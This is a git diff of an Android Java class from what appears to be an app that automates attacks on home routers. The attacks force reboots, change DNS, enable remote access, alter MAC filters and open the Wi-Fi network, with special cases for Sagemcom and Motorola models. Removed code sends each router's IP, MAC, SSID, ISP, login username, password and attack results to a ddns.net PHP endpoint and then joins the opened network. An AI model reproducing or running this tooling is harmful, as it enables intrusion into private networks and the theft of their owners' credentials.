@@ -5,7 +5,6 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.UnsupportedEncodingException;
-import java.net.MalformedURLException;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Iterator;
@@ -40,8 +39,6 @@ import android.annotation.SuppressLint;
 import android.app.ProgressDialog;
 import android.content.Context;
 import android.content.Intent;
-import android.net.wifi.ScanResult;
-import android.net.wifi.WifiConfiguration;
 import android.net.wifi.WifiInfo;
 import android.net.wifi.WifiManager;
 import android.os.AsyncTask;
@@ -71,14 +68,13 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 	private int mCountTipoAtaques;
 	private static final String[] ataques = {"reboot", "dns", "acesso", "filtromac", "abrirrede"};
 			
-	private String urlSalvaBanco;
-	private String urlInsereDado = "http://pedrofreitas.ddns.net/insereinfo.php?";
-
 	private CookieStore cookieStore;
 	private List<Cookie> cookies;
 	
 	private HashMap<String, String> nameValueUrl;		//GET
-	private HashMap<String, String> nameValueParam;		//POST
+	private HashMap<String, String> nameValueParam;		//POST	
+	
+	private AsyncTask<Void, String, Void> salvaBancoTask; 
 	
 	
 	public FinishAtaque(Context mContext, long mIdDadoAtaque, ArrayList<Ataque> mListAtaque, int mCountTipoAtaques, Intent it) {
@@ -108,7 +104,7 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 
 	@Override
 	protected Integer doInBackground(Void... params) {
-		android.os.Debug.waitForDebugger();	
+//		android.os.Debug.waitForDebugger();	
 		
 		DadoDao mDadoDao = new DadoDao(mContext);
 		Dado auxDado = mDadoDao.getDadoWithId(mIdDadoAtaque);		
@@ -182,8 +178,8 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 						
 
 						final HttpParams httpParams = new BasicHttpParams();
-						HttpConnectionParams.setSoTimeout(httpParams, 80000);		//1m20s
-						HttpConnectionParams.setConnectionTimeout(httpParams, 80000);		//1m20s
+						HttpConnectionParams.setSoTimeout(httpParams, 90000);		//1m30s
+						HttpConnectionParams.setConnectionTimeout(httpParams, 90000);		//1m30s
 						
 						HttpClient httpClient = new DefaultHttpClient(httpParams);
 						HttpContext localContext = new BasicHttpContext();	
@@ -276,8 +272,9 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 						} catch (IOException e) {
 							Log.e("ERR_" + ataques[mCountTipoAtaques].toUpperCase() + "_" + mCountAtaques  + "_" + mCountPostGet, "IOException", e);
 							erro = true;
-							//Condicao por causa do ataque abrir rede da sagemcom F@ast 2704N
-							if(auxPostGet.getOrdem() == mListPostGet.size() && auxPostGet.getComando().equals("/wancfg.cmd?action=refresh")) {
+							//Condicao por causa do ataque abrir rede da sagemcom F@ast 2704N e acesso aremoto no motorola surfboard SVG6583
+							if(auxPostGet.getOrdem() == mListPostGet.size() && (auxPostGet.getComando().equals("/wancfg.cmd?action=refresh") ||	
+																				auxPostGet.getComando().equals("/login.asp"))) {
 								mCountPostGet = auxPostGet.getOrdem();
 							} else {
 								mCountAtaques++;								
@@ -345,7 +342,7 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 											WifiManager manager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
 											WifiInfo info = manager.getConnectionInfo();
 											String address = info.getMacAddress();
-											value = value.replaceAll("insereMAC:", address);
+											value = value.replaceAll("insereMAC", address);
 										}
 									}
 									
@@ -362,8 +359,8 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 								
 							
 							final HttpParams httpParams = new BasicHttpParams();
-							HttpConnectionParams.setSoTimeout(httpParams, 80000);		//1m20s
-							HttpConnectionParams.setConnectionTimeout(httpParams, 80000);		//1m20s
+							HttpConnectionParams.setSoTimeout(httpParams, 90000);		//1m30s
+							HttpConnectionParams.setConnectionTimeout(httpParams, 90000);		//1m30s
 							
 							HttpClient httpClient = new DefaultHttpClient(httpParams);
 							HttpContext localContext = new BasicHttpContext();							
@@ -494,7 +491,7 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 		return mCountAtaques;
 	}
 	
-	@Override
+	@SuppressLint("NewApi") @Override
 	protected void onPostExecute(Integer result) {
 		super.onPostExecute(result);
 		int mCountAtaques = (int) result;	
@@ -545,17 +542,18 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 		Log.i("DADO_TEMP", auxDado.toString());
 
 		if(mCountTipoAtaques == ataques.length - 1) {
-			if(!NetworkUtil.isWiFiConnected(mContext)) {
-				reconecta(auxDado);			
-			} 
 			
-			salvaBanco(auxDado);			
+			salvaBancoTask = new SalvaBanco(mContext, auxDado, it);
+			
+			if(!NetworkUtil.isWiFiConnected(mContext)) {
+				new Reconnect(mContext, auxDado, salvaBancoTask).execute(); 		
+			} else {			
+				new SalvaBanco(mContext, auxDado, it).execute();
+			}	
+			
 			mProgress.setMessage("Concluído");
 			mProgress.dismiss();
-			
-			it.putExtra("Dado", auxDado);
-			mContext.startActivity(it);
-		} else {
+		} else {						
 			mCountTipoAtaques++;
 			Log.i("STATUS", "Proximo ataque tipo '" + ataques[mCountTipoAtaques] + "' iniciando...");
 			
@@ -567,136 +565,11 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 			} else {
 				Log.i("LISTA_" + ataques[mCountTipoAtaques].toUpperCase(), "Lista vazia");
 			}	
-			
-			
+						
 			new FinishAtaque(mContext, mIdDadoAtaque, mListAtaque, mCountTipoAtaques, it).execute();					
 		}	
 	}
 	
-	public boolean checkScanResults(Dado auxDado) {
-		WifiManager wifiManager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
-		List<ScanResult> networkList = wifiManager.getScanResults();
-		for(ScanResult network : networkList) {
-			if(network.SSID.equals(auxDado.getSsid())) {				
-				Log.i("SCAN", "SSID=" + network.SSID +
-						"; BSSID=" + network.BSSID +
-						"; capabilities=" + network.capabilities +
-						"; level=" + network.level +
-						"; frequency=" + network.frequency);
-				return true;
-			}
-		}		
-		return false;
-	}
-	
-	@SuppressLint("NewApi") public int checkConfNetworks(Dado auxDado) {
-		WifiManager wifiManager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
-		List<WifiConfiguration> networkListConf = wifiManager.getConfiguredNetworks();
-		for(WifiConfiguration network : networkListConf) {
-			if(network.SSID.equals(auxDado.getSsid())) {
-				Log.i("CONF", "ID=" + network.networkId +
-						"; SSID=" + network.SSID +
-						"; BSSID=" + network.BSSID +
-						"; FQDN=" + network.FQDN +
-						"; PRIO=" + network.priority +
-						"; KeyMgmt=" + network.allowedKeyManagement +
-						"; Protocols=" + network.allowedProtocols +
-						"; AuthAlgorithms=" + network.allowedAuthAlgorithms +
-						"; PairwiseCiphers=" + network.allowedPairwiseCiphers +
-						"; GroupCiphers=" + network.allowedGroupCiphers +
-						"; WepKeys" + network.wepKeys +
-						"; HiddenSSID" + network.hiddenSSID +
-						"; WepTxKeyIndex" + network.wepTxKeyIndex +
-						"; Status=" + network.status);
-				return network.networkId;
-			}
-		}			
-		return (int) -1;
-	}	
-	
-	public void reconecta(Dado auxDado) {		
-		String networkSSID = String.format("\"%s\"", auxDado.getSsid()); 	
-
-		WifiConfiguration conf = new WifiConfiguration();
-		conf.SSID = networkSSID;
-		
-		conf.allowedKeyManagement.clear();
-		conf.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE);
-		
-		conf.allowedProtocols.clear();
-		conf.allowedProtocols.set(WifiConfiguration.Protocol.RSN);
-		conf.allowedProtocols.set(WifiConfiguration.Protocol.WPA);
-		
-		conf.allowedAuthAlgorithms.clear();
-		conf.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP);
-		conf.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.TKIP);
-		conf.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP40);
-		conf.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.WEP104);
-		conf.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.CCMP);
-		conf.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.TKIP);		
-		
-		WifiManager wifiManager = (WifiManager) mContext.getSystemService(Context.WIFI_SERVICE);
-		
-		int networkId = checkConfNetworks(auxDado);
-		if(networkId != -1) {
-			wifiManager.removeNetwork(networkId);	
-			wifiManager.saveConfiguration();
-			Log.i("REMOVE_NET", "Removida rede " + networkSSID + " de id = " + networkId);
-		}
-		
-		networkId = wifiManager.addNetwork(conf);
-		if(networkId != -1) {
-			wifiManager.enableNetwork(networkId, true);
-			wifiManager.saveConfiguration();
-				
-			wifiManager.reconnect();
-			
-			Log.i("ADD_NET", "Removida rede " + networkSSID + " de id = " + networkId);
-		} else {
-			Log.e("ERR_ASSOCIATION", "Falha ao conectar a rede " + networkSSID);
-		}		
-	}
-
-	public void salvaBanco(Dado auxDado) {				
-		if(NetworkUtil.isWiFiConnected(mContext)) {
-			try {
-				urlSalvaBanco = urlInsereDado + "ip=" + auxDado.getIp() + "&gateway=" + auxDado.getGateway() + "&mac=" + auxDado.getMac() + "&ssid=" + auxDado.getSsid().replaceAll("\"", "") + "&operadora=" + auxDado.getOperadora() + 
-						"&data=" + auxDado.getData().replace(" ", "_") + "&fabricante_modelo=" + auxDado.getFabricante_modelo().replace(" ", "_") + "&usuario=" + auxDado.getUsuario().replace(" ", "_") + "&senha=" + auxDado.getSenha().replace(" ", "_") +
-						"&reboot_ataque=" + auxDado.getReboot_ataque() + "&dns_ataque=" + auxDado.getDns_ataque() + "&acesso_remoto_ataque=" + auxDado.getAcesso_remoto_ataque() +
-						"&filtro_mac_ataque=" +	auxDado.getFiltro_mac_ataque() + "&abrir_rede_ataque=" + auxDado.getAbrir_rede_ataque();
-				
-				Log.i("URL_SALVA", urlSalvaBanco.toString());		
-				
-				HttpClient httpClient = new DefaultHttpClient();
-				HttpGet httpGet = new HttpGet(urlSalvaBanco);
-				
-				HttpResponse httpResponse = httpClient.execute(httpGet);
-				
-				Log.i("RESPONSE_STATUS_SALVA", httpResponse.getStatusLine() + "");
-				
-				BufferedReader in = new BufferedReader(new InputStreamReader(httpResponse.getEntity().getContent()));
-				String line;
-				StringBuffer response = new StringBuffer();
-				
-				while((line = in.readLine()) != null) {
-					response.append(line);
-				}
-				in.close();
-				
-				Log.i("CONEXAO_SALVA", response.toString());
-				
-			} catch (MalformedURLException e) {
-				Log.e("ERR_SALVAR", "MalformedURLException", e);
-			} catch (IOException e) {
-				Log.e("ERR_SALVAR", "IOException", e);
-			}			
-			Log.i("DADO_SALVO", auxDado.toString());
-		} else {
-			Log.i("ERR_DADO_SALVO", "Nao foi possivel salvar o dado no ws por nao existir uma conexao wifi ativa");
-		}
-		
-	}
-		
 	public String buildUrl(String url, HashMap nameValueUrl) {
 		for(Object name: nameValueUrl.keySet()) {
 			Log.i("URL_PARAM_NAME", "'" + name.toString() + "'");
@@ -717,8 +590,6 @@ public class FinishAtaque extends AsyncTask<Void, String, Integer> {
 				
 		return url;
 	}
-		
+
+	
 }
-
-
-
